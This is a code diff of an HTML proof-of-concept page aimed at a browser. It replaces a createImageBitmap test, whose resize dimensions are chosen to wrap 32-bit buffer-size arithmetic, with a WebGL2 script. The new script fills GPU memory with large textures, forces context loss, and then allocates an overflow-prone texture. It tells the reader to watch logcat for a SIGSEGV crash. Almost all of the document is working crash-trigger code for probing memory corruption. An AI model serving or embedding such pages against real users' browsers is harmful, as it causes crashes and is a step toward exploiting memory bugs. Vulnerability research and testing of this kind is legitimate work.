@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Bitmap Overflow PoC</h1>
+<h1>GPU Memory Counter Wrap PoC</h1>
 <pre id="log"></pre>
 <script>
 (async function() {
@@ -10,42 +10,65 @@
     console.log(msg);
   };
 
-  // Create a small source canvas
-  const canvas = new OffscreenCanvas(1, 1);
-  const ctx = canvas.getContext('2d');
-  ctx.fillStyle = 'red';
-  ctx.fillRect(0, 0, 1, 1);
-  const blob = await canvas.convertToBlob({type: 'image/png'});
-
-  // These resize dimensions cause 32-bit integer overflows:
-  //   width * height * 4 should wrap to a small non‑zero value
-  const testCases = [
-    {w: 32768, h: 32768},  // product 1,073,741,824 * 4 = 0 (wrap to 0)
-    {w: 46341, h: 46341},  // product 2,147,488,281 * 4 = 100 bytes (wrap)
-    {w: 65536, h: 65536},  // product 4,294,967,296 * 4 = 0
-    {w: 1,     h: 0xFFFFFFFF}, // max unsigned 32-bit
-    {w: 0x10000, h: 0x10001},  // 65536 * 65537 = 0x100010000, lower 32 bits = 0x10000, *4 = 0x40000 (262144 bytes) but dimensions huge
-    {w: 0x40000000, h: 1},     // 1,073,741,824 * 1 * 4 = 4,294,967,296 (wrap to 0)
-  ];
-
-  for (let i = 0; i < 10; i++) {
-    for (const test of testCases) {
-      try {
-        const bitmap = await createImageBitmap(blob, {
-          resizeWidth: test.w,
-          resizeHeight: test.h,
-          resizeQuality: 'low'  // speed up
-        });
-        log(`OK  ${test.w}x${test.h} -> ${bitmap.width}x${bitmap.height}`);
-        bitmap.close();
-      } catch(e) {
-        log(`ERR ${test.w}x${test.h}: ${e.message}`);
-      }
-      // Small delay to allow crash to propagate
-      await new Promise(r => setTimeout(r, 20));
-    }
+  function createGL() {
+    const c = new OffscreenCanvas(256, 256);
+    const gl = c.getContext('webgl2', {
+      powerPreference: 'high-performance',
+      failIfMajorPerformanceCaveat: false
+    });
+    if (!gl) throw new Error('WebGL2 not supported');
+    return gl;
   }
-  log('All done. Check logcat for browser crash.');
+
+  let gl = createGL();
+  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+  const halfSize = Math.floor(maxSize / 2);
+  log(`MAX_TEXTURE_SIZE = ${maxSize}, using ${halfSize}x${halfSize} textures`);
+
+  // Allocate many large textures to fill up discardable memory and wrap the counter
+  const textures = [];
+  for (let i = 0; i < 200; i++) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    // Use half of max to stay within driver limits
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, halfSize, halfSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    textures.push(tex);
+    if (i % 10 === 0) log(`Allocated ${i} textures`);
+  }
+
+  // Force context loss and re-creation to trigger discardable memory purge
+  const loseExt = gl.getExtension('WEBGL_lose_context');
+  if (loseExt) {
+    loseExt.loseContext();
+    log('Context lost');
+  } else {
+    log('WEBGL_lose_context not available');
+  }
+
+  // Wait a bit then try to use the old context (should trigger errors and cleanup)
+  setTimeout(() => {
+    try {
+      gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,new Uint8Array(4));
+      log('Read pixels on lost context succeeded (unexpected)');
+    } catch(e) {
+      log('Read pixels on lost context threw: ' + e.message);
+    }
+    // Create a new context and allocate again to force more pressure
+    setTimeout(async () => {
+      try {
+        const gl2 = createGL();
+        const tex = gl2.createTexture();
+        gl2.bindTexture(gl2.TEXTURE_2D, tex);
+        // This time use a size that, if multiplied by 4 and added to header, might overflow
+        gl2.texImage2D(gl2.TEXTURE_2D, 0, gl2.RGBA, 46341, 1, 0, gl2.RGBA, gl2.UNSIGNED_BYTE, null);
+        gl2.readPixels(0,0,1,1,gl2.RGBA,gl2.UNSIGNED_BYTE,new Uint8Array(4));
+        log('Second context allocated fine');
+      } catch(e) {
+        log('Second context error: ' + e.message);
+      }
+      log('Test sequence complete. Watch logcat for SIGSEGV.');
+    }, 500);
+  }, 500);
 })();
 </script>
 </body>
